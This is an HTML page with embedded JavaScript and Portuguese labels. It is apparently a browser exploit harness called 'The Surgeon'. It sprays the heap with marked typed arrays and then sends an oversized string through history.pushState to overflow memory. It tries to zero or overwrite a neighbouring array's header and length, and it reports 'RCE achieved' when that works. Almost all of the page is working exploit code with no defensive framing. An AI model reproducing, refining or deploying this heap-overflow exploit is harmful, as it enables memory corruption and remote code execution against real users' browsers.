<!DOCTYPE html>
<html>
<head>
    <title>The Surgeon: Layered Injection</title>
    <style>
        body { background: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #008888; height: 350px; overflow-y: scroll; padding: 10px; background: #001111; color: #fff; margin-bottom: 15px;}
        button { 
            padding: 15px; width: 100%; font-size: 18px; font-weight: bold; 
            margin-bottom: 10px; cursor: pointer; border: 1px solid #00aaaa; 
            background: #002222; color: #00ffff; transition: 0.2s;
        }
        button:hover { background: #00ffff; color: #000; }
        .h-group { display: flex; gap: 5px; justify-content: space-between; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>THE SURGEON: 709518 BASE</h1>
    <p>Status: Base Estável. Iniciando reconstrução do vizinho.</p>

    <div id="logger" class="log">Selecione a profundidade da cirurgia...</div>

    <button onclick="runLayer(8, [0])">1. Zerar Header (8 Bytes de 0x00)</button>

    <button onclick="runLayer(16, [0])">2. Zerar Header + Butterfly (16 Bytes)</button>

    <button onclick="runLayer(16, [0], [0x00, 0x20, 0x00, 0x00])">3. INJETAR LENGTH (16 Zeros + Tamanho)</button>

    <button onclick="runLayer(20, [0], [0x00, 0x20, 0x00, 0x00])">4. INJETAR LENGTH PROFUNDO (20 Zeros + Tamanho)</button>


    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 8000; 

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        // Constrói string repetida ou composta
        function buildOverflow(paddingSize, paddingVal, tailBytes) {
            let s = "";
            // Padding (Zeros)
            for(let i=0; i<paddingSize; i++) s += String.fromCharCode(paddingVal[0]);
            
            // Tail (O Tamanho ou bytes finais)
            if(tailBytes) {
                for(let b of tailBytes) s += String.fromCharCode(b);
            }
            return s;
        }

        async function runLayer(padSize, padVal, tail) {
            let totalBytes = padSize + (tail ? tail.length : 0);
            log("---------------------------------------");
            log(`CIRURGIA: Base + ${totalBytes} Bytes`);
            log(`Padding: ${padSize}x Zeros | Tail: ${tail ? tail.map(x=>x.toString(16)) : 'Nenhum'}`);

            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray Linear (Sem Buracos, pois 709518 já é alinhado)
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                spray.push(arr);
            }

            log("Aguardando estabilização...");
            await new Promise(r => setTimeout(r, 800));

            try {
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = buildOverflow(padSize, padVal, tail);
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption();

            } catch(e) {
                log("ERRO JS: " + e.message, "red");
            }
        }

        function checkCorruption() {
            let found = false;
            // Checa de trás pra frente
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                if(arr) {
                    // 1. SUCESSO TOTAL (Length Mudou para algo útil)
                    if(arr.length !== 1024 && arr.length !== 0 && arr.length !== undefined) {
                        document.body.style.background = "#0f0";
                        alert(`RCE ALCANÇADO!\nIndex: ${i}\nLength: ${arr.length}`);
                        return;
                    }

                    // 2. SUCESSO PARCIAL (Objeto Morto/Zerado)
                    // Se o length virar 0 ou der erro ao acessar, significa que ZERAMOS o header/butterfly.
                    // Isso é ótimo, pois prova controle de escrita (Write Primitive).
                    let dead = false;
                    try {
                        if(arr.length === 0) dead = true;
                    } catch(e) { dead = true; }

                    if(dead) {
                        found = true;
                        log(`VIZINHO [${i}] NEUTRALIZADO (Length 0/Morto). Header ZERADO com sucesso!`, "#0f0");
                        return;
                    }

                    // 3. Corrupção de Dados
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`Index ${i}: Dados alterados.`, "yellow");
                    }
                }
            }
            if(!found) log("Nenhum efeito visível. Tente a próxima camada (mais bytes).");
        }
    </script>
</body>
</html>
